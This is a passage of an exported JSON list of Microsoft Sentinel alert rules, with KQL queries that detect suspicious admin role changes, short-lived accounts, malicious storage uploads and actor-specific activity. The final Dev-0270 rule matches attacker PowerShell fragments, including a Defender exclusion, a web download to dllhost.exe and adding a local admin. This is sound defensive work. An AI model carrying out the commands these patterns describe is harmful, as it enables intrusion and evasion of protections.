instances where a newly invited external user is granted an administrative role. By default this query\nwill alert on any granted administrative role, however this can be modified using the roles variable if false positives occur\nin your environment. The maximum delta between invite and escalation to admin is 60 minues, this can be configured using the \ndeltaBetweenInviteEscalation variable.\nPLATFORM:Azure AD,IaaS,Microsoft 365,Windows\nMITRE:TA0001;T1078;T1078.001;T1078.002;T1078.003;T1078.004,TA0003;T1098;T1098.001;T1098.003","alertRuleTemplateName":"d7424fd9-abb3-4ded-a723-eebe023aaa0b","lastModifiedUtc":"2024-10-02T21:37:05.0679193Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/84551b91-d159-483b-9b83-e4d6b583c1e3","name":"84551b91-d159-483b-9b83-e4d6b583c1e3","etag":"\"88009231-0000-2700-0000-66fdd0060000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"AuditLogs\n  | where Category =~ \"ApplicationManagement\"\n  | where Result =~ \"success\"\n  | where OperationName =~ 'Update Application'\n  | mv-expand TargetResources\n  | mv-expand TargetResources.modifiedProperties\n  | where TargetResources_modifiedProperties.displayName =~ \"AppAddress\"\n  | extend Key = tostring(TargetResources_modifiedProperties.displayName)\n  | extend NewValue = TargetResources_modifiedProperties.newValue\n  | extend OldValue = TargetResources_modifiedProperties.oldValue\n  | where isnotempty(Key) and isnotempty(NewValue)\n  | project-reorder Key, NewValue, OldValue\n  | extend NewUrls = extract_all('\"Address\":([^,]*)', tostring(NewValue))\n  | extend OldUrls = extract_all('\"Address\":([^,]*)', tostring(OldValue))\n  | extend AddedUrls = set_difference(NewUrls, OldUrls)\n  | where array_length(AddedUrls) > 0\n  | extend UserAgent = iif(tostring(AdditionalDetails[0].key) == \"User-Agent\", tostring(AdditionalDetails[0].value), \"\")\n  | extend AddingUser = iif(isnotempty(tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)) , tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName), \"\")\n  | extend AddingApp = iif(isnotempty(tostring(parse_json(tostring(InitiatedBy.app)).servicePrincipalName)) , tostring(parse_json(tostring(InitiatedBy.app)).servicePrincipalName), \"\")\n  | extend AddedBy = iif(isnotempty(AddingUser), AddingUser, AddingApp)\n  | project-away AddingApp, AddingUser\n  | extend AppDisplayName = tostring(TargetResources.displayName)\n  | extend ipAddress = tostring(parse_json(tostring(InitiatedBy.user)).ipAddress)\n  | project-reorder TimeGenerated, AppDisplayName, AddedUrls, AddedBy, UserAgent, ipAddress","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"AddedUrls"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AddedBy"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"ipAddress"}]}],"templateVersion":"1.0.1","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence","PrivilegeEscalation"],"techniques":["T1078"],"displayName":"Application Redirect URL Update","enabled":true,"description":"Detects the redirect URL of an app being changed.\n  Applications associated with URLs not controlled by the organization can pose a security risk.\n  Ref: https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-applications#application-configuration-changes\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0001;T1078;T1078.001;T1078.003;T1078.004,TA0003;T1098;T1098.005,TA0004;T1098;T1098.005,TA0005;T1078;T1078.001;T1078.003;T1078.004","alertRuleTemplateName":"a1080fc1-13d1-479b-8340-255f0290d96c","lastModifiedUtc":"2024-10-02T22:58:14.5335947Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/826c98d0-9d71-4a98-aa83-5350f1f21a1d","name":"826c98d0-9d71-4a98-aa83-5350f1f21a1d","etag":"\"8500afd5-0000-2700-0000-66fdabd00000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT12H","queryPeriod":"PT12H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"DeviceProcessEvents\n| where ProcessCommandLine has_any (\"New-Mailbox\",\"Update-RoleGroupMember\") and ProcessCommandLine has \"HealthMailbox55x2yq\"\n| extend timestamp = TimeGenerated, AccountCustomEntity =  InitiatingProcessAccountName, HostCustomEntity = DeviceName\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"HostCustomEntity"}]}],"templateVersion":"1.0.1","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence"],"techniques":["T1136"],"displayName":"Unusual identity creation using exchange powershell","enabled":true,"description":"The query below identifies creation of unusual identity by the Europium actor to mimic Microsoft Exchange Health Manager Service account using Exchange PowerShell commands\n  Reference: https://www.microsoft.com/security/blog/2022/09/08/microsoft-investigates-iranian-attacks-against-the-albanian-government/\nPLATFORM:Azure AD,Microsoft 365,IaaS\nMITRE:TA0002;T1059;T1059.009,TA0003;T1136;T1136.003","alertRuleTemplateName":"0a3f4f4f-46ad-4562-acd6-f17730a5aef4","lastModifiedUtc":"2024-10-02T20:23:44.1246999Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/855357a3-1451-41ce-aaf3-5abc6c13a849","name":"855357a3-1451-41ce-aaf3-5abc6c13a849","etag":"\"8700c33d-0000-2700-0000-66fdbfc80000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Collect the alert events\nlet alertData = SecurityAlert\n| where DisplayName has \"Potential malware uploaded to\"\n| extend Entities = parse_json(Entities)\n| mv-expand Entities;\n//Parse the IP address data\nlet ipData = alertData\n| where Entities['Type'] =~ \"ip\"\n| extend AttackerIP = tostring(Entities['Address']), AttackerCountry = tostring(Entities['Location']['CountryName']);\n//Parse the file data\nlet FileData = alertData\n| where Entities['Type'] =~ \"file\"\n| extend MaliciousFileDirectory = tostring(Entities['Directory']), MaliciousFileName = tostring(Entities['Name']), MaliciousFileHashes = tostring(Entities['FileHashes']);\n//Combine the File and IP data together\nipData\n| join (FileData) on VendorOriginalId\n| summarize by TimeGenerated, AttackerIP, AttackerCountry, DisplayName, ResourceId, AlertType, MaliciousFileDirectory, MaliciousFileName, MaliciousFileHashes\n//Create a type column so we can track if it was a File storage or blobl storage upload\n| extend type = iff(DisplayName has \"file\", \"File\", \"Blob\")\n| join (\n  union\n  StorageFileLogs,\n  StorageBlobLogs\n  //File upload operations\n  | where OperationName =~ \"PutBlob\" or OperationName =~ \"PutRange\"\n  //Parse out the uploader IP\n  | extend ClientIP = tostring(split(CallerIpAddress, \":\", 0)[0])\n  //Extract the filename from the Uri\n  | extend FileName = extract(@\"\\/([\\w\\-. ]+)\\?\", 1, Uri)\n  //Base64 decode the MD5 filehash, we will encounter non-ascii hex so string operations don't work\n  //We can work around this by making it an array then converting it to hex from an int\n  | extend base64Char = base64_decode_toarray(ResponseMd5)\n  | mv-expand base64Char\n  | extend hexChar = tohex(toint(base64Char))\n  | extend hexChar = iff(strlen(hexChar) < 2, strcat(\"0\", hexChar), hexChar)\n  | extend SourceTable = iff(OperationName has \"range\", \"StorageFileLogs\", \"StorageBlobLogs\")\n  | summarize make_list(hexChar, 1000) by CorrelationId, ResponseMd5, FileName, AccountName, TimeGenerated, RequestBodySize, ClientIP, SourceTable\n  | extend Md5Hash = strcat_array(list_hexChar, \"\")\n  //Pack the file information the summarise into a ClientIP row\n  | extend p = pack(\"FileName\", FileName, \"FileSize\", RequestBodySize, \"Md5Hash\", Md5Hash, \"Time\", TimeGenerated, \"SourceTable\", SourceTable)\n  | summarize UploadedFileInfo=make_list(p, 10000), FilesUploaded=count() by ClientIP\n      | join kind=leftouter (\n        union\n        StorageFileLogs,\n        StorageBlobLogs\n        | where OperationName =~ \"DeleteFile\" or OperationName =~ \"DeleteBlob\"\n        | extend ClientIP = tostring(split(CallerIpAddress, \":\", 0)[0])\n        | extend FileName = extract(@\"\\/([\\w\\-. ]+)\\?\", 1, Uri)\n        | extend SourceTable = iff(OperationName has \"range\", \"StorageFileLogs\", \"StorageBlobLogs\")\n        | extend p = pack(\"FileName\", FileName, \"Time\", TimeGenerated, \"SourceTable\", SourceTable)\n        | summarize DeletedFileInfo=make_list(p, 10000), FilesDeleted=count() by ClientIP\n        ) on ClientIP\n  ) on $left.AttackerIP == $right.ClientIP\n| mvexpand UploadedFileInfo\n| extend LinkedMaliciousFileName = tostring(UploadedFileInfo.FileName)\n| extend LinkedMaliciousFileHash = tostring(UploadedFileInfo.Md5Hash)\n| extend HashAlgorithm = \"MD5\"\n| project AlertTimeGenerated = TimeGenerated, LinkedMaliciousFileName, LinkedMaliciousFileHash, HashAlgorithm, AlertType, AttackerIP, AttackerCountry, MaliciousFileDirectory, MaliciousFileName, FilesUploaded, UploadedFileInfo","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"AttackerIP"}]},{"entityType":"FileHash","fieldMappings":[{"identifier":"Algorithm","columnName":"HashAlgorithm"},{"identifier":"Value","columnName":"LinkedMaliciousFileHash"}]}],"templateVersion":"1.0.3","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CommandAndControl","Exfiltration"],"techniques":["T1071","T1567"],"displayName":"Linked Malicious Storage Artifacts","enabled":true,"description":"This query identifies the additional files uploaded by the same IP address which triggered a malware alert for malicious content upload on Azure Blob or File Storage Container.\nPLATFORM:Azure AD\nMITRE:TA0003;T1098;T1098.005","alertRuleTemplateName":"b9e3b9f8-a406-4151-9891-e5ff1ddd8c1d","lastModifiedUtc":"2024-10-02T21:48:56.0668232Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/3f3f1fc3-4cc2-4b7d-bc17-b39d27acb63a","name":"3f3f1fc3-4cc2-4b7d-bc17-b39d27acb63a","etag":"\"8700c51b-0000-2700-0000-66fdbd8b0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P7D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let lookback = 7d; \nlet timeframe = 1h; \nlet GlobalAdminsRemoved = AuditLogs \n| where TimeGenerated > ago(timeframe) \n| where Category =~ \"RoleManagement\" \n| where AADOperationType in (\"Unassign\", \"RemoveEligibleRole\") \n| where ActivityDisplayName has_any (\"Remove member from role\", \"Remove eligible member from role\") \n| mv-apply TargetResource = TargetResources on \n  (\n      where TargetResource.type =~ \"User\"\n      | extend Target = tostring(TargetResource.userPrincipalName),\n               props = TargetResource.modifiedProperties\n  )\n| mv-apply Property = props on \n      (\n          where Property.displayName =~ \"Role.DisplayName\"\n          | extend RoleName = trim('\"',tostring(Property.oldValue))\n      )\n| where RoleName =~ \"Global Administrator\" // Add other Privileged role if applicable\n| extend InitiatingAppName = tostring(InitiatedBy.app.displayName)\n| extend InitiatingAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n| extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n| extend InitiatingAadUserId = tostring(InitiatedBy.user.id)\n| extend InitiatingIpAddress = tostring(iff(isnotempty(InitiatedBy.user.ipAddress), InitiatedBy.user.ipAddress, InitiatedBy.app.ipAddress))\n| extend Initiator = iif(isnotempty(InitiatingAppName), InitiatingAppName, InitiatingUserPrincipalName) \n| where Initiator != \"MS-PIM\"  // Filtering PIM events  \n| summarize RemovedGlobalAdminTime = max(TimeGenerated), TargetAdmins = make_set(Target,100) by OperationName, RoleName, Initiator, InitiatingAppName, InitiatingAppServicePrincipalId, InitiatingUserPrincipalName, InitiatingAadUserId, InitiatingIpAddress, Result; \nlet GlobalAdminsAdded = AuditLogs \n| where TimeGenerated > ago(lookback) \n| where Category =~ \"RoleManagement\" \n| where AADOperationType in (\"Assign\", \"AssignEligibleRole\") \n| where ActivityDisplayName has_any (\"Add eligible member to role\", \"Add member to role\") and Result == \"success\" \n| mv-apply TargetResource = TargetResources on \n  (\n      where TargetResource.type =~ \"User\"\n      | extend Target = tostring(TargetResource.userPrincipalName),\n               props = TargetResource.modifiedProperties\n  )\n| mv-apply Property = props on \n      (\n          where Property.displayName =~ \"Role.DisplayName\"\n          | extend RoleName = trim('\"',tostring(Property.newValue))\n      )\n| where RoleName =~ \"Global Administrator\" // Add other Privileged role if applicable\n| extend InitiatingAppName = tostring(InitiatedBy.app.displayName)\n| extend Initiator = iif(isnotempty(InitiatingAppName), InitiatingAppName, tostring(InitiatedBy.user.userPrincipalName)) \n| where Initiator != \"MS-PIM\"  // Filtering PIM events \n| summarize AddedGlobalAdminTime = max(TimeGenerated) by OperationName, RoleName, Target, Initiator, Result;\nGlobalAdminsAdded \n| join kind= inner GlobalAdminsRemoved on $left.Target == $right.Initiator \n| where AddedGlobalAdminTime < RemovedGlobalAdminTime \n| extend NoofAdminsRemoved = array_length(TargetAdmins) \n| where NoofAdminsRemoved > 1\n| project AddedGlobalAdminTime, Initiator, InitiatingAppName, InitiatingAppServicePrincipalId, InitiatingUserPrincipalName, InitiatingAadUserId, InitiatingIpAddress, Target, RemovedGlobalAdminTime, TargetAdmins, NoofAdminsRemoved\n| extend TargetName = tostring(split(Target,'@',0)[0]), TargetUPNSuffix = tostring(split(Target,'@',1)[0])\n| extend InitiatedByName = tostring(split(InitiatingUserPrincipalName,'@',0)[0]), InitiatedByUPNSuffix = tostring(split(InitiatingUserPrincipalName,'@',1)[0])\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"Target"},{"identifier":"Name","columnName":"TargetName"},{"identifier":"UPNSuffix","columnName":"TargetUPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"InitiatingUserPrincipalName"},{"identifier":"Name","columnName":"InitiatedByName"},{"identifier":"UPNSuffix","columnName":"InitiatedByUPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"InitiatingAadUserId"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"InitiatingAppServicePrincipalId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"InitiatingIpAddress"}]}],"templateVersion":"1.0.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":["T1531"],"displayName":"Multiple admin membership removals from newly created admin.","enabled":true,"description":"This query detects when newly created Global admin removes multiple existing global admins which can be an attempt by adversaries to lock down organization and retain sole access. \n Investigate reasoning and intention of multiple membership removal by new Global admins and take necessary actions accordingly.\nPLATFORM:Azure AD,Microsoft 365,IaaS\nMITRE:TA0004;T1548;T1548.005","alertRuleTemplateName":"cda5928c-2c1e-4575-9dfa-07568bc27a4f","lastModifiedUtc":"2024-10-02T21:39:19.9370056Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/76131dbd-0aae-41ce-808f-56787490be07","name":"76131dbd-0aae-41ce-808f-56787490be07","etag":"\"1b00b4c2-0000-2700-0000-66d8a50d0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P7D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let core_domains = (SigninLogs\n  | where TimeGenerated > ago(7d)\n  | where ResultType == 0\n  | extend domain = tolower(split(UserPrincipalName, \"@\")[1])\n  | summarize by tostring(domain));\n  let alternative_domains = (SigninLogs\n  | where TimeGenerated > ago(7d)\n  | where isnotempty(AlternateSignInName)\n  | where ResultType == 0\n  | extend domain = tolower(split(AlternateSignInName, \"@\")[1])\n  | summarize by tostring(domain));\n  AuditLogs\n  | where TimeGenerated > ago(1d)\n  | where OperationName =~ \"Add User\"\n  | extend AddingUser = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)\n  | extend AddingSPN = tostring(parse_json(tostring(InitiatedBy.app)).servicePrincipalName)\n  | extend AddedBy = iif(isnotempty(AddingUser), AddingUser, AddingSPN)\n  | extend UserAdded = tostring(TargetResources[0].userPrincipalName)\n  | extend Domain = tolower(split(UserAdded, \"@\")[1])\n  | where Domain !in (core_domains) and Domain !in (alternative_domains)\n  | project-away AddingUser\n  | project-reorder TimeGenerated, UserAdded, Domain, AddedBy","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AddedBy"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserAdded"}]}],"templateVersion":"1.0.1","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence","InitialAccess","PrivilegeEscalation","DefenseEvasion"],"techniques":["T1078"],"displayName":"Account created from non-approved sources","enabled":true,"description":"This query looks for account being created from a domain that is not regularly seen in a tenant.\n  Attackers may attempt to add accounts from these sources as a means of establishing persistant access to an environment.\n  Created accounts should be investigated to ensure they were legitimated created.\n  Ref: https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-user-accounts#short-lived-accounts\n\n\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows;MITRE:TA0001;T1078;T1078.001;T1078.002;T1078.003;T1078.004,TA0003;T1078;T1078.001;T1078.002;T1078.003;T1078.004,TA0004;T1078;T1078.001;T1078.002;T1078.003;T1078.004,TA0005;T1078;T1078.001;T1078.002;T1078.003;T1078.004","alertRuleTemplateName":"99d589fa-7337-40d7-91a0-c96d0c4fa437","lastModifiedUtc":"2024-09-04T18:21:00.0483347Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/6cf90279-0d73-46f5-85aa-14d82b78acfe","name":"6cf90279-0d73-46f5-85aa-14d82b78acfe","etag":"\"86009edb-0000-2700-0000-66fdb9820000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P7D","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"let IPs = dynamic ([\"199.249.230.\",\"185.220.101.\",\"23.129.64.\",\"109.70.100.\",\"185.220.102.\"]);\nOfficeActivity\n| where RecordType in (\"AzureActiveDirectoryAccountLogon\", \"AzureActiveDirectoryStsLogon\") \n| where Operation != 'UserLoggedIn'\n| extend UserAgent = iff(parse_json(ExtendedProperties)[0].Name =~ \"UserAgent\", extractjson(\"$[0].Value\", ExtendedProperties, typeof(string)),\"\")\n| mv-expand parse_json(ExtendedProperties)\n| where ExtendedProperties.Name =~ \"RequestType\"\n| extend RequestType = ExtendedProperties.Value\n| where ClientIP has_any (IPs)\n| summarize authAttempts=dcount(TimeGenerated), firstAttempt=min(TimeGenerated), lastAttempt=max(TimeGenerated), uniqueIPs=dcount(ClientIP), uniqueAccounts=dcount(UserId), attemptedAccounts=make_set(UserId) by UserAgent\n| where authAttempts > 2500\n| extend timestamp = firstAttempt\n| sort by uniqueAccounts","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"templateVersion":"2.0.1","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CredentialAccess"],"techniques":["T1110"],"displayName":"Possible Forest Blizzard attempted credential harvesting - Sept 2020","enabled":true,"description":"Surfaces potential Forest Blizzard group Office365 credential harvesting attempts within OfficeActivity Logon events.\nReferences: https://www.microsoft.com/security/blog/2020/09/10/strontium-detecting-new-patters-credential-harvesting/.\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0006;T1110;T1110.001;T1110.003;T1528","alertRuleTemplateName":"04384937-e927-4595-8f3c-89ff58ed231f","lastModifiedUtc":"2024-10-02T21:22:08.3965045Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/80ad1a9a-2d53-4d1f-acef-37084e2dfa44","name":"80ad1a9a-2d53-4d1f-acef-37084e2dfa44","etag":"\"1b008db1-0000-2700-0000-66d8a33a0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let queryfrequency = 1h;\nlet queryperiod = 1d;\nAuditLogs\n| where TimeGenerated > ago(queryfrequency)\n| where OperationName =~ \"Delete user\"\n| mv-apply TargetResource = TargetResources on \n  (\n      where TargetResource.type == \"User\"\n      | extend TargetUserPrincipalName = extract(@'([a-f0-9]{32})?(.*)', 2, tostring(TargetResource.userPrincipalName))\n  )\n| extend DeletedByApp = tostring(InitiatedBy.app.displayName),\nDeletedByAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId),\nDeletedByUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName),\nDeletedByAadUserId = tostring(InitiatedBy.user.id),\nDeletedByIPAddress = tostring(InitiatedBy.user.ipAddress)\n| project Deletion_TimeGenerated = TimeGenerated, TargetUserPrincipalName, DeletedByApp, DeletedByAppServicePrincipalId, DeletedByUserPrincipalName, DeletedByAadUserId, DeletedByIPAddress, \nDeletion_AdditionalDetails = AdditionalDetails, Deletion_InitiatedBy = InitiatedBy, Deletion_TargetResources = TargetResources\n| join kind=inner (\n    AuditLogs\n    | where TimeGenerated > ago(queryperiod)\n    | where OperationName =~ \"Add user\"      \n    | mv-apply TargetResource = TargetResources on \n      (\n          where TargetResource.type == \"User\"\n          | extend TargetUserPrincipalName = trim(@'\"',tostring(TargetResource.userPrincipalName))\n      )\n    | project-rename Creation_TimeGenerated = TimeGenerated\n) on TargetUserPrincipalName\n| extend TimeDelta = Deletion_TimeGenerated - Creation_TimeGenerated\n| where  TimeDelta between (time(0s) .. queryperiod)\n| extend CreatedByApp = tostring(InitiatedBy.app.displayName),\nCreatedByAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId),\nCreatedByUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName),\nCreatedByAadUserId = tostring(InitiatedBy.user.id),\nCreatedByIPAddress = tostring(InitiatedBy.user.ipAddress)\n| project Creation_TimeGenerated, Deletion_TimeGenerated, TimeDelta, TargetUserPrincipalName, DeletedByApp, DeletedByAppServicePrincipalId, DeletedByUserPrincipalName, DeletedByAadUserId, DeletedByIPAddress, \nCreatedByApp, CreatedByAppServicePrincipalId, CreatedByUserPrincipalName, CreatedByAadUserId, CreatedByIPAddress, Creation_AdditionalDetails = AdditionalDetails, Creation_InitiatedBy = InitiatedBy, Creation_TargetResources = TargetResources, Deletion_AdditionalDetails, Deletion_InitiatedBy, Deletion_TargetResources\n| extend TargetName = tostring(split(TargetUserPrincipalName,'@',0)[0]), TargetUPNSuffix = tostring(split(TargetUserPrincipalName,'@',1)[0])\n| extend CreatedByName = tostring(split(CreatedByUserPrincipalName,'@',0)[0]), CreatedByUPNSuffix = tostring(split(CreatedByUserPrincipalName,'@',1)[0])\n| extend DeletedByName = tostring(split(DeletedByUserPrincipalName,'@',0)[0]), DeletedByUPNSuffix = tostring(split(DeletedByUserPrincipalName,'@',1)[0])\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"TargetUserPrincipalName"},{"identifier":"Name","columnName":"TargetName"},{"identifier":"UPNSuffix","columnName":"TargetUPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"CreatedByUserPrincipalName"},{"identifier":"Name","columnName":"CreatedByName"},{"identifier":"UPNSuffix","columnName":"CreatedByUPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"CreatedByAadUserId"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"DeletedByUserPrincipalName"},{"identifier":"Name","columnName":"DeletedByName"},{"identifier":"UPNSuffix","columnName":"DeletedByUPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"DeletedByAadUserId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"CreatedByIPAddress"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"DeletedByIPAddress"}]}],"templateVersion":"1.1.0","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1078"],"displayName":"Account Created and Deleted in Short Timeframe","enabled":true,"description":"Search for user principal name (UPN) events. Look for accounts created and then deleted in under 24 hours. Attackers may create an account for their use, and then remove the account when no longer needed.\n\nRef : https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-user-accounts#short-lived-account\nPLATFORM:Azure AD,Microsoft 365,IaaS;MITRE:TA0001;T1078;T1078.004","alertRuleTemplateName":"bb616d82-108f-47d3-9dec-9652ea0d3bf6","lastModifiedUtc":"2024-09-04T18:13:11.4057717Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/bc918fb6-c4ec-4902-a58b-ea6082cbfcc0","name":"bc918fb6-c4ec-4902-a58b-ea6082cbfcc0","etag":"\"87008268-0000-2700-0000-66fdc2a50000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT6H","queryPeriod":"PT6H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"DeviceProcessEvents \n| where (FileName =~ \"powershell.exe\" and ((ProcessCommandLine has_all(\"try\", \"Add-MpPreference\", \"-ExclusionPath\", \"ProgramData\", \"catch\"))  or (ProcessCommandLine has_all('Add-PSSnapin', 'Get-Recipient', '-ExpandProperty', 'EmailAddresses', 'SmtpAddress', '-hidetableheaders'))))\nor ( InitiatingProcessFileName =~ 'powershell.exe' and (((InitiatingProcessCommandLine has_all('$file=', 'dllhost.exe', 'Invoke-WebRequest', '-OutFile')) or ((InitiatingProcessCommandLine has_all('$admins=', 'System.Security.Principal.SecurityIdentifier', 'Translate', '-split', 'localgroup', '/add', '$rdp='))))))\n| extend timestamp = TimeGenerated, AccountCustomEntity =  InitiatingProcessAccountName, HostCustomEntity = DeviceName\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"HostCustomEntity"}]}],"templateVersion":"1.0.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution","DefenseEvasion","Discovery","CommandAndControl"],"techniques":["T1059","T1562","T1087","T1105"],"displayName":"Dev-0270 Malicious Powershell 